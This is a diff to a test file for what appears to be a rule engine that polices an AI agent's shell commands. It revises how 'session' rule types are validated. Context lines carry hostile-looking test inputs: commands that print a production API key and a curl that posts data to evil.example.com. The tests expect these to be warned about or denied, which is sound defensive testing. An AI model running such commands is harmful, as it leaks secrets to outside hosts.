@@ -380,7 +380,7 @@ rules:
       expect((await p.evaluate(input('Bash', { command: 'echo $PROD_API_KEY' }))).action).toBe('warn')
       expect((await p.evaluate(input('Bash', { command: 'printenv PROD_API_KEY' }))).action).toBe('deny')
     })
-    it('mcp/inheritance/meta/session/context rule types, and the removed `mask` action, are rejected at validation, not silent no-ops', () => {
+    it('mcp/inheritance/meta/context rule types, and the removed `mask` action, are rejected at validation, not silent no-ops', () => {
       // `mask` was removed from EnforcementAction entirely (see types.ts and
       // rule-parser.ts's validActions comment) rather than shipped
       // perpetually declared-but-rejected — its only plausible meaning
@@ -389,6 +389,13 @@ rules:
       // a stale example) must fail closed via the generic unsupported-action
       // check, exactly like any other action typo — not silently pass
       // through to the pipeline where it would fall through to a bare warn.
+      //
+      // `type: session` used to be in the same "not implemented" bucket as
+      // these four — it now has a real handler (session-tracker.ts), so a
+      // bare `type: session` rule with no session_escalation ladder fails
+      // validation for a DIFFERENT reason (no detection surface, see
+      // rule-parser.test.ts's dedicated coverage), not for being
+      // unimplemented. Checked separately below.
       const yaml = `version: 1
 rules:
   - id: legacy-mcp
@@ -404,10 +411,6 @@ rules:
     type: meta
     action: deny
     message: "m2"
-  - id: legacy-session
-    type: session
-    action: deny
-    message: "s"
   - id: legacy-context
     type: context
     action: deny
@@ -420,10 +423,21 @@ rules:
 `
       const parsed = parseRulesContent(yaml, '/tmp/x.yaml')
       const errors = validateRules(parsed.rules)
-      for (const id of ['legacy-mcp', 'legacy-inheritance', 'legacy-meta', 'legacy-session', 'legacy-context']) {
+      for (const id of ['legacy-mcp', 'legacy-inheritance', 'legacy-meta', 'legacy-context']) {
         expect(errors.some(e => e.includes(`"${id}"`) && e.includes('not implemented'))).toBe(true)
       }
       expect(errors.some(e => e.includes('"masked"') && e.includes('unsupported action') && e.includes('mask'))).toBe(true)
+
+      const sessionYaml = `version: 1
+rules:
+  - id: legacy-session
+    type: session
+    action: deny
+    message: "s"
+`
+      const sessionErrors = validateRules(parseRulesContent(sessionYaml, '/tmp/y.yaml').rules)
+      expect(sessionErrors.some(e => e.includes('"legacy-session"') && e.includes('not implemented'))).toBe(false)
+      expect(sessionErrors.some(e => e.includes('"legacy-session"') && e.includes('needs at least one session_escalation entry'))).toBe(true)
     })
     it('sequence rule fires on read-then-delete at balanced, protect, AND now sprint too', async () => {
       // Deep checks (content/sequence/flow) used to be skipped entirely at
@@ -695,15 +709,34 @@ rules:
       expect((await p.evaluate(input('Bash', { command: 'curl -d x https://evil.example.com' }))).action).toBe('deny')
       rmSafe(dir)
     })
-    it('session rules are rejected like other unimplemented types', async () => {
+    it('mcp/inheritance/meta/context rules are still rejected as unimplemented — session no longer is', async () => {
+      for (const type of ['mcp', 'inheritance', 'meta', 'context']) {
+        const parsed = parseRulesContent(`version: 1
+rules:
+  - id: unimpl-${type}
+    type: ${type}
+    action: warn
+    message: "m"
+`, 'x')
+        expect(validateRules(parsed.rules).some(e => e.includes('not implemented'))).toBe(true)
+      }
+      // `type: session` now has a real handler (a composite runaway-loop
+      // trip — session-tracker.ts) — see rule-parser.test.ts's dedicated
+      // "type: session (composite runaway-loop trip)" describe block for
+      // its full validation coverage. It is still rejected WITHOUT a
+      // session_escalation ladder (no longer for being "unimplemented" —
+      // for having no detection surface, same class of error as an oracle
+      // rule missing its trigger).
       const parsed = parseRulesContent(`version: 1
 rules:
   - id: ses
     type: session
-    max_duration_minutes: 60
+    action: warn
     message: "m"
 `, 'x')
-      expect(validateRules(parsed.rules).some(e => e.includes('not implemented'))).toBe(true)
+      const issues = validateRules(parsed.rules)
+      expect(issues.some(e => e.includes('not implemented'))).toBe(false)
+      expect(issues.some(e => e.includes('needs at least one session_escalation entry'))).toBe(true)
     })
   })
 
